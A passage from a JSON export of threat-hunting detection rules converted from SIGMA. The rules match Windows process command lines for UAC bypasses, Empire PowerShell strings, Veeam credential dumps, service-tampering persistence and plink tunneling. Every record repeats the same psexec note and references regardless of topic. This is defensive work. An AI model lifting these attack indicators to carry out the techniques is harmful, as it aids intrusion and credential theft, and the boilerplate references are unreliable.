            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"COMPlus_ETWEnabled\" or tgt.process.cmdline contains \"COMPlus_ETWFlags\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 749
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Abusing Winsat Path Parsing - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and src.process.image.path contains \"\\AppData\\Local\\Temp\\system32\\winsat.exe\" and src.process.cmdline contains \"C:\\Windows \\system32\\winsat.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 750
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes spawning from \"sigverif.exe\", which could indicate potential abuse of the latter as a living of the land binary in order to proxy execution.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Uncommon Sigverif.EXE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\sigverif.exe\" and (not (tgt.process.image.path in (\"C:\\Windows\\System32\\WerFault.exe\",\"C:\\Windows\\SysWOW64\\WerFault.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 751
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process execution from a fake recycle bin folder, often used to avoid security solution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Process Execution From Fake Recycle.Bin Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"RECYCLERS.BIN\\\" or tgt.process.image.path contains \"RECYCLER.BIN\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 752
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "Potential Discovery Activity Via Dnscmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\dnscmd.exe\" and (tgt.process.cmdline contains \"/enumrecords\" or tgt.process.cmdline contains \"/enumzones\" or tgt.process.cmdline contains \"/ZonePrint\" or tgt.process.cmdline contains \"/info\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 753
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects RDP session hijacking by using MSTSC shadowing",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1563"
            ],
            "name": "Potential MSTSC Shadowing Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"noconsentprompt\" and tgt.process.cmdline contains \"shadow:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 754
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects some Empire PowerShell UAC bypass methods",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "HackTool - Empire PowerShell UAC Bypass",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update)\" or tgt.process.cmdline contains \" -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update);\")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 755
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Shell Process Spawned by Java.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\java.exe\" and (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")) and (not (src.process.image.path contains \"build\" and tgt.process.cmdline contains \"build\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 756
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects dump of credentials in VeeamBackup dbo",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1005"
            ],
            "name": "VeeamBackup Database Credentials Dump Via Sqlcmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sqlcmd.exe\" and (tgt.process.cmdline contains \"SELECT\" and tgt.process.cmdline contains \"TOP\" and tgt.process.cmdline contains \"[VeeamBackup].[dbo].[Credentials]\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 757
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543",
                "t1574"
            ],
            "name": "Potential Persistence Attempt Via Existing Service Tampering",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"sc \" and tgt.process.cmdline contains \"config \" and tgt.process.cmdline contains \"binpath=\") or (tgt.process.cmdline contains \"sc \" and tgt.process.cmdline contains \"failure\" and tgt.process.cmdline contains \"command=\")) or (((tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \"add \" and tgt.process.cmdline contains \"FailureCommand\") or (tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \"add \" and tgt.process.cmdline contains \"ImagePath\")) and (tgt.process.cmdline contains \".sh\" or tgt.process.cmdline contains \".exe\" or tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".bin$\" or tgt.process.cmdline contains \".bat\" or tgt.process.cmdline contains \".cmd\" or tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".msh$\" or tgt.process.cmdline contains \".reg$\" or tgt.process.cmdline contains \".scr\" or tgt.process.cmdline contains \".ps\" or tgt.process.cmdline contains \".vb\" or tgt.process.cmdline contains \".jar\" or tgt.process.cmdline contains \".pl\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 758
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "HackTool - F-Secure C3 Load by Rundll32",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"rundll32.exe\" and tgt.process.cmdline contains \".dll\" and tgt.process.cmdline contains \"StartNodeRelay\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 759
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This rule detects execution of PowerShell scripts located in the \"C:\\Users\\Public\" folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Execution of Powershell Script in Public Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"-f C:\\Users\\Public\" or tgt.process.cmdline contains \"-f \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-f %Public%\" or tgt.process.cmdline contains \"-fi C:\\Users\\Public\" or tgt.process.cmdline contains \"-fi \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-fi %Public%\" or tgt.process.cmdline contains \"-fil C:\\Users\\Public\" or tgt.process.cmdline contains \"-fil \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-fil %Public%\" or tgt.process.cmdline contains \"-file C:\\Users\\Public\" or tgt.process.cmdline contains \"-file \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-file %Public%\"))) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 760
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The OpenWith.exe executes other binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "OpenWith.exe Executes Specified Binary",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\OpenWith.exe\" and tgt.process.cmdline contains \"/c\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 761
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the 'Get-Clipboard' cmdlet via CLI",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1115"
            ],
            "name": "PowerShell Get-Clipboard Cmdlet Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"Get-Clipboard\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 762
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Execution of plink to perform data exfiltration and tunneling",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "Potential RDP Tunneling Via Plink",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\plink.exe\" and tgt.process.cmdline contains \":127.0.0.1:3389\") or ((tgt.process.image.path contains \"\\plink.exe\" and tgt.process.cmdline contains \":3389\") and (tgt.process.cmdline contains \" -P 443\" or tgt.process.cmdline contains \" -P 22\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 763
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1218",
                "t1202"
            ],
            "name": "Uncommon Child Process Of BgInfo.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\bginfo.exe\" or src.process.image.path contains \"\\bginfo64.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 764
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects events that appear when a user click on a link file with a powershell command in it",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Hidden Powershell in Link File Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\Windows\\explorer.exe\" and tgt.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \".lnk\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 765
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1082"
            ],
            "name": "Suspicious Kernel Dump Using Dtrace",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\dtrace.exe\" and tgt.process.cmdline contains \"lkd(0)\") or (tgt.process.cmdline contains \"syscall:::return\" and tgt.process.cmdline contains \"lkd(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 766
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of a Microsoft signed script executing a managed DLL with PowerShell.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "UtilityFunctions.ps1 Proxy Dll",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
